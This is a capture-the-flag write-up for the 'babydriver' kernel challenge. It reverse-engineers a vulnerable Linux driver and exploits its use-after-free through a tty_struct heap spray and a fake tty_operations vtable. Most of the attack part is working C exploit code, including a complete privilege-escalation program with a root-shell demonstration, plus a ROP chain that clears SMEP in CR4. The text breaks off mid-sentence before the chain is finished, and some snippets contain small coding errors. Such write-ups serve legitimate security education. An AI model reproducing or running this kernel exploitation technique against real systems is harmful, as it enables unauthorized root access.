# babydriver (kernel, uaf, tty_struct, smep, -smap, -kaslr)
This was my third kernel challenge and first in which I had to exploit use after free vulnerability. I will not explain here what bzImage/*.cpio files are as I've did this in [previous](https://github.com/kscieslinski/CTF/tree/master/pwn/hacklu2019/BabyKernel2) kernel writeup.

## Enumeration
### Looking inside
I've started with unpacking provided files and looking inside rootfs.cpio:

```console
$ tar -xf babydriver_0D09567FACCD2E891578AA83ED3BABA7.tar
$ ls
boot.sh  bzImage  rootfs.cpio
$ mkdir extracted
$ cd extracted
$ zcat ../rootfs.cpio | cpio -idvm .
.
etc
etc/init.d
etc/passwd
etc/group
bin
bin/su
bin/grep
bin/watch
[...]
$ ls lib/modules/4.4.72/
babydriver.ko
```

So as usuall, we are given kernel compressed image (bzImage) along with filesystem (rootfs.cpio) in which we can find kernel module binary (babydriver.ko).

Unfortunately we are not given vmlinux nor System.map. Both would be really helpful when debugging.

### RE
Having kernel module binary I've opened it under Ghidra. The reverse engineering part was super easy.

```c

struct babydev_t {
    char *device_buf;
    size_t device_buf_len;
};

struct babydev_t babydev_struct;


int babyopen(void *inode,void *filep)
{
  babydev_struct.device_buf = (char *)kmalloc(0x40, GFP_KERNEL);
  babydev_struct.device_buf_len = 0x40;
  printk("device open\n");
  return 0;
}

int babyrelease(void *inode,void *filep)
{
  kfree(babydev_struct.device_buf);
  printk("device release\n");
  return 0;
}

ssize_t babyread(struct file *filep, char *__user buff, size_t count, loff_t *offp)
{
    if (babydev_struct.device_buf && babydev_struct.device_buf_len >= count)
    {
        copy_to_user(buf, babydev_struct.device_buf, count);
    }

    return 0;
}

ssize_t babywrite(struct file *filep, char *__user buff, size_t count, loff_t *offp)
{
    if (babydev_struct.device_buf && babydev_struct.device_buf_len >= count)
    {
        copy_from_user(babydev_struct.device_buf, buf, count);
    }

    return 0;
}

long babyioctl(struct file *filep, unsigned int cmd, unsigned long arg)
{
    if (cmd == 0x10001)
    {
        kfree(babydev_struct.device_buf);
        babydev_struct.device_buf = (char *)kmalloc(arg, GFP_KERNEL);
        babydev_struct.device_buf_len = arg;
        printk(KERN_INFO "alloc done\n");
        return 0;
    }
    else
    {
        printk(KERN_INFO "default arg is %lx\n", 0x10001);
        return -EINVAL;
    }
}
```

There is one global variable: `babydev_struct`. When opening a device we allocate a buffer of size 0x40 and when closing we free this buffer. Moreover we can write to and read from a buffer and resize it.


### UAF
Of course this is very bad and vulnerable example of code. One should use a `private_data` field of `struct file` for allocating custom per open data.

Why above code is vulnerable? Well, imagine we open `/dev/babydev` twice and then close it once:

```c
int fd1 = open("/dev/babydev", O_RDWR, 0);
int fd2 = open("/dev/babydev", O_RDWR, 0);
close(fd1);
```

 On first call to open a buffer (let's name it buffer1) of size 0x40 gets allocated and we get a handle fd1. On second call to open we allocate new buffer (name it buffer2), get handle fd2 and we just loose track of the previous one. As c has no garbage collector this leads to memory leaks but it is not vulnerable itself. But then we call close(fd1) and we free the buffer2. The memory chunk gets placed back to kmalloc_cache but we still can access it via fd2. This is standard example of use-after-free vulnerability.

## Exploit
As I had no experience with exploiting use-after-free I used [lexfo](https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part1.html) tutorial a lot. I really recommend it to anyone who want's to start with kernel exploitation. Moreover I saw some writeups later on and it seems that there is another way to repair the stack with `swapgs` gadget.

### Gaining control over RIP via tty_struct
Above in UAF section I've presented a situation where a freed memory chunk gets placed back in kmalloc_cache but we can still write and read on it. To gain control over execution flow we have to force kernel allocator (SLUB) to allocate some object we have control over on the chunk we freed. There are standard techniques for this. One of them is using `tty_struct` object of size 0x2e0 for this (0x2e0 will land in bucket: 2^10).

```c
int fd1 = open("/dev/babydev", O_RDWR, 0);
int fd2 = open("/dev/babydev", O_RDWR, 0);

ioctl(fd1, 0x10001, 0x2e0); // resize, so chunk get placed in right bucket

close(fd1);

int tty_fd = open("/dev/ptmx", O_RDWR | O_NOCTTY, 0); // alocates tty_struct of size 0x2e0


```

If you are having troubles imagine how it looks like, I've created a diagram to help you. 
This is how a situation looks like after executing `int fd1 = open("/dev/babydev", O_RDWR, 0);`. 

![](img/diagram1.png)

As you can see, the buffer1 of size 0x40 got allocated and we can write/read from it using fd1 descriptor.

Then we open /dev/babydev again: `int fd2 = open("/dev/babydev", O_RDWR, 0);`

![](img/diagram2.png)

And same as before, a new buffer2 gets allocated. We loose track of buffer1, but it doesn't get returned to SLUB allocator as it wasn't directly freed. The super important part here is that we can write/read from the buffer using both fd1 and fd2!!!

Then we just call resize with `ioctl` operation: `ioctl(fd1, 0x10001, 0x2e0);`:

![](img/diagram3.png)

so that when freed, the memory chunk the buffer3 occupies will be placed back to bucket 2^11.

Now we close fd1 with `close(fd1);`:

![](img/diagram4.png)

The buffer3 gets freed and returned to SLUB allocator. SLUB allocator will then place it inside kmalloc_cache_cpu or inside one of slabs inside kmem_cache_node (in first situation our exploit has more chance to succeed). At the same time we cannot write/read from buffer using fd1 anymore, but we can write/read from buffer using fd2!!!

Now we allocate a struct tty_struct of size 0x2e0 by opening /dev/ptmx: `int tty_fd = open("/dev/ptmx", O_RDWR | O_NOCTTY, 0);`. You can read more about it [here](https://linux.die.net/man/4/ptmx):

![](img/diagram5.png)

As you can see, tty_struct got filled with some data. The interesting field for us is `const struct tty_operations*` which is a pointer to virtual function table. Anytime user invokes a function such as `ioctl`, a kernel will use this pointer to find vtable and then will invoke an `ioctl` function from it:

```c
struct tty_operations {
	struct tty_struct * (*lookup)(struct tty_driver *driver,
			struct file *filp, int idx);
	int  (*install)(struct tty_driver *driver, struct tty_struct *tty);
    [...]
	int  (*ioctl)(struct tty_struct *tty,
    [...]
};

struct tty_struct {
	int	magic;
	struct kref kref;
	struct device *dev;
	struct tty_driver *driver;
	const struct tty_operations *ops;
    [...]
};
```

But remember, we still can access buffer3 and so we can overwrite tty_struct. We will overwrite tty_struct.ops field to point to fake vtable which we will create before. Our payload:

```c
#define TTY_HDR_SIZE 0x20

int fd1 = open("/dev/babydev", O_RDWR, 0);
int fd2 = open("/dev/babydev", O_RDWR, 0);

ioctl(fd1, 0x10001, 0x2e0); // resize, so chunk get placed in right bucket

close(fd1);

int tty_fd = open("/dev/ptmx", O_RDWR | O_NOCTTY, 0); // alocates tty_struct of size 0x2e0

struct tty_operations fake_tty_operations;
memset(fake_tty_operations, 0x41, sizeof(struct tty_operations));

char fake_tty_header[TTY_HDR_SIZE];
read(fd2, fake_tty_header, sizeof(fake_tty_header); // read first not to overwrite any other values
/* Overwrite tty_operations field of struct tty pointer to point to fake_tty_operations vtable. */
*((uint64_t *)fake_tty_header + 3) = (uint64_t)fake_tty_operations;
write(fd2, fake_tty_header, sizeof(fake_tty_header);

/* triger arbitrary call */
ioctl(tty_fd, 0, 0);
```

After write and before ioctl our memory layout looks like:

![](img/diagram6.png)

and so when calling `ioctl(tty_fd, 0, 0)` a function under 12 index in fake_tty_operations will get called. In this case it would cause kernel panic as smep is enabled and perhaps memory under 0x4141414141414141 is not mapped.

### Small win
If there where no smep protection enabled, we could get a shell at this point. Just instead of invoking 0x4141414141414141, we would call userland function which would increase current process privilages and then open shell. This is yet another very popular technique:

`commit_creds(prepare_kernel_cred(NULL));`

copies kernel (ring 0) credentials to current process. But before let's increase our exploit reliability. At this moment the chance that SLUB allocates same memory chunk we freed for tty_struct is high only because we are working on virtual machine where not much is going on. In reallity we would have much bigger problems. To increase our chances we can both prevent the scheduler from moving us to different cpu and to perform heap-spray technique. The latter just instead of allocating one tty_struct and hoping we will have luck allocates many tty_structs (we still do not have 100% it would work, but for sure our chances will increase).

Our first exploit assuming there is no smep will look like:

```c
/**
 * Compile with: gcc exploit.c -o exploit -O0 -std=c99 -Wall --static
 */

#define _GNU_SOURCE
#include <asm/types.h>
#include <mqueue.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <linux/netlink.h>
#include <pthread.h>
#include <errno.h>
#include <stdbool.h>
#include <sched.h>
#include <stddef.h>
#include <sys/mman.h>
#include <stdint.h>
#include <sys/ioctl.h>
#include <sys/mman.h>

/*****************************************************************************
 ** FUNCTION HEADERS
 *****************************************************************************/
int migrate_to_cpu0(void);
int init(int *fd, int *fd2);
int set_buf_size(int fd, size_t sz);
int triger_uaf(int fd, int fd2);
int escalate(int fd);
int alloc_fake_structures(void);
typedef int (*commit_creds_func)(void *new);
typedef void *(*prepare_kernel_creds_func)(void *daemon);

/*****************************************************************************
 ** OTHER CONSTANTS
 *****************************************************************************/
#define HEAP_SPRAY_POWER 100
#define PAGE_SIZE 4096

#define _getpid() syscall(__NR_getpid)
#define _sched_setaffinity(pid, cpusetsize, mask) \
    syscall(__NR_sched_setaffinity, pid, cpusetsize, mask)
#define _mmap(addr, length, prot, flags, fd, offset) \
    syscall(__NR_mmap, addr, length, prot, flags, fd, offset)

/*****************************************************************************
 ** TARGET_SPECIFIC_CONSTANTS\MACROS
 *****************************************************************************/
#define SET_BUF_SIZE_CMD 0x10001
#define REALLOCATION_SIZE 0x2e0

#define TTY_OPERATIONS_SIZE 0xf0
#define IOCTL_STRUCT_TTY_OPERATIONS_OFST 0x18
#define MAGIC_STRUCT_TTY_OPERATIONS_OFST 0x0
#define TTY_MAGIC 0x5401
#define TTY_HDR_SIZE 0x20

#define COMMIT_CREDS ((void *)0xffffffff810a1420)
#define PREPARE_KERNEL_CRED ((void *)0xffffffff810a1810)

#define commit_creds(cred) \
    (((commit_creds_func)(COMMIT_CREDS))(cred))

#define prepare_kernel_cred(daemon) \
    (((prepare_kernel_creds_func)(PREPARE_KERNEL_CRED))(daemon))

/*****************************************************************************
 ** GLOBALS
 *****************************************************************************/
int g_tty_fds[HEAP_SPRAY_POWER];
char *g_fake_tty_operations;

static void payload(void)
{
    commit_creds(prepare_kernel_cred(NULL));
}

int migrate_to_cpu0(void)
{
    int err;
    cpu_set_t set;

    CPU_ZERO(&set);
    CPU_SET(0, &set);

    err = _sched_setaffinity(_getpid(), sizeof(set), &set);
    if (err == -1)
    {
        perror("[-] Failed to migrate to cpu0");
        goto fail;
    }

    return 0;
fail:
    return -1;
}

int set_buf_size(int fd, size_t sz)
{
    int err;

    err = ioctl(fd, SET_BUF_SIZE_CMD, sz);
    if (err < 0)
    {
        perror("[-] Failed to set buf size");
        goto fail;
    }

    return 0;
fail:
    return -1;
}

int alloc_fake_structures(void)
{
    g_fake_tty_operations = malloc(TTY_OPERATIONS_SIZE);
    memset(g_fake_tty_operations, 0x41, TTY_OPERATIONS_SIZE);
    *((uint64_t *)g_fake_tty_operations + 12) = (uint64_t)payload;

    return 0;
}

/**
 * Open and resize the device_buffer twice.
 */
int init(int *fd, int *fd2)
{
    if (migrate_to_cpu0() < 0)
        goto fail;

    if (alloc_fake_structures() < 0)
        goto fail;

    *fd = open("/dev/babydev", O_RDWR, 0);
    if (*fd < 0)
    {
        perror("[-] Failed to open /dev/babydev");
        goto fail;
    }

    *fd2 = open("/dev/babydev", O_RDWR, 0);
    if (*fd2 < 0)
    {
        perror("[-] Failed to open /dev/babydev");
        goto fail;
    }

    if (set_buf_size(*fd, REALLOCATION_SIZE) < 0)
        goto fail;
    if (set_buf_size(*fd2, REALLOCATION_SIZE) < 0)
        goto fail;

    return 0;
fail:
    return -1;
}

/**
 * Free fd2 and allocate reallocation gadgets to create use-after-free.
 */
int triger_uaf(int fd, int fd2)
{
    int magic;

    /* Free slub object. Note that we still control it from fd. */
    close(fd2);

    /* Heap spray. */
    for (int i = 0; i < HEAP_SPRAY_POWER; ++i)
    {
        g_tty_fds[i] = open("/dev/ptmx", O_RDWR | O_NOCTTY, 0);
        if (g_tty_fds[i] < 0)
        {
            perror("Failed to open /dev/ptmx");
            goto fail;
        }
    }

    /* Check if we successfully gained use-after-free. */
    if (read(fd, &magic, sizeof(magic)) != sizeof(magic))
    {
        perror("read failed:");
        goto fail;
    }

    if (magic != TTY_MAGIC)
    {
        fprintf(stderr, "[-] Magic number mismatch, expected: %x, got: %x", TTY_MAGIC, magic);
        goto fail;
    }

    return 0;
fail:
    return -1;
}

int escalate(int fd)
{
    char fake_tty_header[TTY_HDR_SIZE];

    /* Overwrite tty_operations field of struct tty pointer to point to fake_tty_operations vtable. */
    if (read(fd, fake_tty_header, sizeof(fake_tty_header)) != sizeof(fake_tty_header))
    {
        perror("read struct tty header failed");
        goto fail;
    }
    *((uint64_t *)fake_tty_header + 3) = (uint64_t)g_fake_tty_operations;

    if (write(fd, fake_tty_header, sizeof(fake_tty_header)) != sizeof(fake_tty_header))
    {
        perror("[-] Failed to overwrite struct tty\n");
        goto fail;
    }

    /* Triger stack pivot. */
    for (int i = 0; i < HEAP_SPRAY_POWER; ++i)
        ioctl(g_tty_fds[i], 0, 0);

    return 0;
fail:
    return -1;
}

int main()
{
    int fd, fd2;

    if (init(&fd, &fd2) < 0)
    {
        fprintf(stderr, "[-] Failed to initialize data.\n");
        goto fail;
    }
    printf("[+] Initialization succeed.\n");

    if (triger_uaf(fd, fd2) < 0)
    {
        fprintf(stderr, "[-] Failed to triger use-after-free vulnerability.\n");
        goto fail;
    }
    printf("[+] Triggered use-after-free.\n");

    if (escalate(fd) < 0)
    {
        fprintf(stderr, "[-] Failed to escalate\n");
        goto fail;
    }
    printf("[+] Escalation phase succeed.\n");

    printf("[i] Poping shell...");
    system("/bin/sh");

    return 0;

fail:
    return -1;
}
```

We can test it out. Remember to remove +smep from boot.sh!

```console
/ $ id
uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
/ $ ./exploit
[    4.651448] device open
[    4.653243] device open
[    4.653810] alloc done
[    4.654281] alloc done
[+] Initialization succeed.
[    4.655208] device release
[+] Triggered use-after-free.
[+] Escalation phase succeed.
/ # id
uid=0(root) gid=0(root)
/ #
```

### Protections
You migh wonder how did I knew smep is enabled. To check software and hardware protections I've checked `boot.sh` file:

```bash
#!/bin/bash

stty intr ^]
qemu-system-x86_64 -initrd rootfs.cpio -kernel bzImage -append 'console=ttyS0 root=/dev/ram oops=panic panic=1' -enable-kvm -monitor /dev/null -m 64M --nographic  -smp cores=1,threads=1 -cpu kvm64,+smep
```

Note: I've added `stty intr ^]` so that I can eassly kill qemu on kernel panic.

So from reading `boot.sh` we can determinate that there is a hardware protection `smep` (Supervisor mode execution protection), but fortunetely there is no `kaslr` (kernel address space layout randomization) turn on.

This means that we will have to bypass `smep` before invoking userland code as smep does not allow kernel to execute code from userland.

### Plan
As we cannot directly execute userland code, we have to use ROP instead. We will:
- [x] trigger use-after-free with tty_struct
- [x] create fake tty_operations and overwrite tty_struct->ops field so it points to it
- [ ] allocate fake stack and then overwrite fake tty_operations.ioctl field with a gadget which will pivot the kernel stack
- [ ] save rsp/rbp registers to restore them after ROP
- [ ] disable smep
- [ ] jump to userland function which will restore the saved rsp & rbp and call `commit_creds(prepare_kernel_cred(NULL));`
- [ ] pop shell with system("/bin/sh")

### Looking for gadgets
To find gadgets we need to extract vmlinux first. We will extract it from bzImage, but it will not contain any symbols and so it won't be really helpful when debugging.
I've used [z2x](https://github.com/zuiurs/z2x):

```console
$ z2x bzImage
$ file vmlinux
vmlinux: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, BuildID[sha1]=e993ea9809ee28d059537a0d5e866794f27e33b4, stripped
$ ROPgadget --binary vmlinux | sort > gadget.lst
```

First we need to find a gadget for stack pivoting. For this we have to check the state of registers just when calling our arbitrary address (ioctl). You can do it either with gdb or by making kernel panic. I've picked the first option.

We need to stop at the beginning of payload function. To get address of it we can first add a simple printf which will display payload address and then breakpoint on babywrite. To get address of babywrite use /proc/kallsyms:

```console
$ cat /proc/kallsyms | grep baby
ffffffffc0000000 t babyrelease	[babydriver]
ffffffffc00024d0 b babydev_struct	[babydriver]
ffffffffc0000030 t babyopen	[babydriver]
ffffffffc0000080 t babyioctl	[babydriver]
ffffffffc00000f0 t babywrite	[babydriver]
ffffffffc0000130 t babyread	[babydriver]
```

add a printf statement:

```c
int alloc_fake_structures(void)
{
    g_fake_tty_operations = malloc(TTY_OPERATIONS_SIZE);
    *((uint64_t *)g_fake_tty_operations + 12) = (uint64_t)payload;

    printf("[i] payload: %p\n", payload);

    return 0;
}
```

In the first tab run modified boot.sh script with added -s -S flags:

```console
$ cat gboot.sh
#!/bin/bash

qemu-system-x86_64 -initrd rootfs.cpio -kernel bzImage -append 'console=ttyS0 root=/dev/ram oops=panic panic=1' -enable-kvm -monitor /dev/null -m 64M --nographic  -smp cores=1,threads=1 -cpu kvm64 -s -S

$ sudo ./gboot.sh
./exploit
```

and in the second tab run gdb. Set hardware breakpoint on babywrite, continue and check first tab (where address of payload should be displayed)

```gdb
$ gdb
(gdb) target remote :1234
(gdb) hb *0xffffffffc00000f0
Hardware assisted breakpoint 2 at 0x400b4d
(gdb) Continuing.
Breakpoint 1, 0xffffffffc00000f0 in ?? ()
(gdb)
```

check first tab for paylad address:

```console
$ ./exploit
[i] payload: 0x400b4d
[    7.270036] device open
[    7.271057] device open
[    7.271772] alloc done
[    7.272395] alloc done
[+] Initialization succeed.
[    7.273337] device release
[+] Triggered use-after-free.
```

Now go back to second tab and set hardware breakpoint on payload function and continue execution. When it hits a breakpoint check registers:

```gdb
(gdb) hb *0x400b4d
Hardware assisted breakpoint 2 at 0x400b4d
(gdb) c
Continuing.
Breakpoint 2, 0x0000000000400b4d in ?? ()
(gdb) info registers
rax            0x400b4d	4197197
rbx            0xffff880000a59000	-131941384482816
rcx            0x1da6b20	31091488
rdx            0x0	0
rsi            0x0	0
rdi            0xffff880000a59000	-131941384482816
rbp            0xffff880000a53e98	0xffff880000a53e98
rsp            0xffff880000a53de8	0xffff880000a53de8
r8             0x1da5880	31086720
r9             0x16	22
r10            0x0	0
r11            0x293	659
r12            0x0	0
r13            0x0	0
r14            0xffff880002bd8500	-131941349358336
r15            0xffff880000a59800	-131941384480768
rip            0x400b4d	0x400b4d
```

You want to look for userland addresses. In this case in rcx there is an userland address:

```console
(gdb) x/2gx 
0x1da6b20:	0x4141414141414141	0x4141414141414141
```

More precisely, rcx contains address of fake tty_operations! One idea would be to find a stack pivot gadget: mov rsp, rcx. It's not bad, but there are two problems:

1) If we pivot the stack to point to fake tty_operation structure, then we have to find another way to jump over our gadget which is at 0x18 offset. 

2) There is not mov rsp, rXX nor xchg rsp, rXX gadget :)

But there is still hope. We can allocate fake tty_operations at address higher then 32 bits and fake stack at address equal to: tty_opeartions & 0xffffffff. Then we will use `mov esp, ecx` gadget (the higher 32 bits will be zeroed) to pivot the stack.

To allocate structures at a specific memory use mmap instead of malloc.

```c

#define MOV_ESP_ECX ((uint64_t)0xffffffff8101dd39)

/**
 * Allocate fake tty_operations struct and fake stack. Use mmap syscall to 
 * allocate:
 * - g_fake_stack at low memory region
 * - g_fake_tty_operations above 0xffffffff address
 * Moreover g_fake_stack must be equal to g_fake_tty_operations & 0xffffffff.
 * We will use above property later when performing stack pivot. We will use:
 * `mov esp, ecx ; ret` 
 * gadget, where rcx holds address of g_fake_tty_operations. This way we will
 * make esp point to g_fake_stack.
 */
int alloc_fake_structures(void)
{
    /* Arbitrary value, must not collide with already mapped memory (/proc/<PID>/maps) */
    void *starting_addr = (void *)0x100000000 + 0x20000000;
    size_t max_try = 10;

retry:
    g_fake_tty_operations = (char *)_mmap(starting_addr, TTY_OPERATIONS_SIZE, PROT_READ | PROT_WRITE, MAP_FIXED | MAP_SHARED | MAP_ANONYMOUS | MAP_LOCKED | MAP_POPULATE, -1, 0);
    if (g_fake_tty_operations == MAP_FAILED)
        goto retry;

    g_fake_stack = (char *)_mmap((uint64_t)g_fake_tty_operations & 0xffffffff, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_FIXED | MAP_SHARED | MAP_ANONYMOUS | MAP_LOCKED | MAP_POPULATE, -1, 0);
    if (g_fake_stack == MAP_FAILED)
    {
        munmap((void *)g_fake_tty_operations, TTY_OPERATIONS_SIZE);
        goto retry;
    }

    /* Paranoid check :) */
    if ((uint64_t)g_fake_stack != ((uint64_t)g_fake_tty_operations & 0xffffffff))
    {
        munmap((void *)g_fake_tty_operations, TTY_OPERATIONS_SIZE);
        munmap((void *)g_fake_stack, PAGE_SIZE);
        goto retry;
    }

    if (max_try == 0)
    {
        fprintf(stderr, "[-] Failed to allocate fake structures\n");
        return -1;
    }
    max_try--;
    starting_addr += PAGE_SIZE;

    printf("[i] g_fake_tty_operations: %p\n", g_fake_tty_operations);
    printf("[i] g_fake_stack: %p\n", g_fake_stack);

    memset(g_fake_tty_operations, 0x41, TTY_OPERATIONS_SIZE);
    /* Set fake_tty_operations->ioctl=stack_pivot gadget. */
    *((uint64_t *)g_fake_tty_operations + 12) = MOV_ESP_ECX;

    build_rop_chain((uint64_t *)g_fake_stack);

    return 0;
}
```

Now we need to buid rop chain. We start with saving rsp and rbp. It would be much easier if we have used a xchg rsp, rcx or xchg esp, rcx gadget to pivot the stack, but I couldn't find any. We will save just rbp as we saw before that offset between rsp and rbp is equal to 0xb0 (look at registers values above, rsp=0xffff880000a53de8, rbp=0xffff880000a53e98).

I found such gadgets to save rbp:

```c
#define POP_RCX ((uint64_t)0xffffffff8100700c)
#define MOV_DWORDPTR_RCX_EAX ((uint64_t)0xffffffff81004d05)
#define XCHG_RBP_RAX ((uint64_t)0xffffffff81446980)
#define SHR_RAX_32 ((uint64_t)0xffffffff81216ede)

#define STORE_EAX(addr)        \
    *stack++ = POP_RCX;        \
    *stack++ = (uint64_t)addr; \
    *stack++ = MOV_DWORDPTR_RCX_EAX;

#define SAVE_RBP(addr_hi, addr_lo) \
    *stack++ = XCHG_RBP_RAX;       \
    STORE_EAX(addr_lo);            \
    *stack++ = SHR_RAX_32;         \
    STORE_EAX(addr_hi);
```

and such to disable smep:

```c
#define SMEP_MASK (~((uint64_t)(1 << 20)))

#define MOV_CR4_RDI ((uint64_t)0xffffffff81004d80)
#define MOV_RAX_CR4 ((uint64_t)0xffffffff81004c14)
#define POP_RSI ((uint64_t)0xffffffff812c6c4e)
#define AND_RAX_RSI ((uint64_t)0xffffffff815df7f6)
#define MOV_RDI_RAX ((uint64_t)0xffffffff8133b32e)

#define DISABLE_SMEP()             \
    *stack++ = MOV_RAX_CR4;        \
    *stack++ = 0x4141414141414141; \
    *stack++ = POP_RSI;            \
    *stack++ = SMEP_MASK;          \
    *stack++ = AND_RAX_RSI;        \
    *stack++ = 0x4141414141414141; \
    *stack++ = MOV_RDI_RAX;        \
    *stack++ = 0x4141414141414141; \
    *stack++ = 0x4141414141414141; \
    *stack++ = MOV_CR4_RDI;        \
    *stack++ = 0x4141414141414141;
```

To disable smep we had to disable smep flag in CR4 register (20th bit).

Now we can jump to assembly 

## References:
- https://blog.csdn.net/lukuen/article/details/6935068